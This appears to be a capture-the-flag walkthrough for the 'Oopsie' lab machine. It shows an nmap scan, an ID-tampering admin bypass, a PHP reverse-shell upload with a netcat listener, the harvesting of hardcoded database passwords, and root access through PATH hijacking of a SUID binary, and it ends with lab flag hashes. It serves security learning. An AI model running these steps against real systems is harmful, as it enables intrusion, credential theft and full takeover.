┌──(root㉿kali)-[~]
└─# nmap -sC -sV 10.129.175.92
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-22 02:54 EDT
Nmap scan report for 10.129.175.92
Host is up (0.084s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.49 seconds

http://10.129.175.92/

dirbuster>
 
http://10.129.175.92/cdn-cgi/login/ >> Login as guest link >> account link >> http://10.129.175.92/cdn-cgi/login/admin.php?content=accounts&id=2

id=1

http://10.129.175.92/cdn-cgi/login/admin.php?content=accounts&id=1 >> ID 34322	Name admin	

http://10.129.175.92/cdn-cgi/login/admin.php?content=uploads with cookie id and role

upload: phprevsh.php

┌──(root㉿kali)-[~]
└─# nc -lvlp 1234    >> http://{TARGET_IP}/uploads/phprevsh.php 

$ python3 -c 'import pty;pty.spawn("/bin/bash")'

www-data@oopsie: cat /etc/passwd > robert

www-data@oopsie:/var/www/html/cdn-cgi/login$ ls
ls
admin.php  db.php  index.php  script.js
www-data@oopsie:/var/www/html/cdn-cgi/login$ cat * | grep -i passw*
cat * | grep -i passw*
if($_POST["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!")
<input type="password" name="password" placeholder="Password" />

www-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>

www-data@oopsie:/var/www/html/cdn-cgi/login$ su robert  
Password: M3g4C0rpUs3r!

robert@oopsie:/var/www/html/cdn-cgi/login$ cd ~ 
robert@oopsie:~$ ls
user.txt
robert@oopsie:~$ cat user.txt
cat user.txt
f2c74ee8db7983851ab2a96a44eb7981

===================================================================================
Priv Escalation
===================================================================================
robert@oopsie:~$ sudo -l
[sudo] password for robert: M3g4C0rpUs3r!

Sorry, user robert may not run sudo on oopsie.

robert@oopsie:~$ id
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)

robert@oopsie:~$ find / -group bugtracker 2>/dev/null
/usr/bin/bugtracker

robert@oopsie:~$ ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker  ##  what privilege && what type of file 

-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
/usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped

-rw(S)r-xr-- >> SUID (Set owner User ID), the special permission for the user access
level has a single function: A file with SUID always executes as the user who owns the
file, regardless of the user passing the command. If the file owner doesn't have
execute permissions, then use an uppercase S here.
In our case, the binary 'bugtracker' is owned by root & we can execute it as root since
it has SUID set.

robert@oopsie: /usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 11
11
---------------

cat: /root/reports/11: No such file or directory



The tool is accepting user input as a name of the file that will be read using the cat command, however, it
does not specifies the whole path to file cat and thus we might be able to exploit this.
We will navigate to /tmp directory and create a file named cat with the following content:
We will then set the execute privileges:
In order to exploit this we can add the /tmp directory to the PATH environmental variable.
Commonly noted as SUID (Set owner User ID), the special permission for the user access
level has a single function: A file with SUID always executes as the user who owns the
file, regardless of the user passing the command. If the file owner doesn't have
execute permissions, then use an uppercase S here.
In our case, the binary 'bugtracker' is owned by root & we can execute it as root since
it has SUID set.
                     
					robert@oopsie: cd /tmp
					robert@oopsie:/tmp$ echo "/bin/sh" > cat 	
					robert@oopsie:/tmp$ chmod +x cat
					robert@oopsie:/tmp$ export PATH=/tmp:$PATH
					robert@oopsie:/tmp$ echo $PATH
					/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
					robert@oopsie:/tmp$ 
					robert@oopsie: /usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 11
11
---------------

cat: /root/reports/11: No such file or directory
# whoami
root
# cd /root
# vi root.txt
					 



[[2;2Ree69f8a877c3faf667f7beacf
af13b0bee69f8a877c3faf667f7beacf










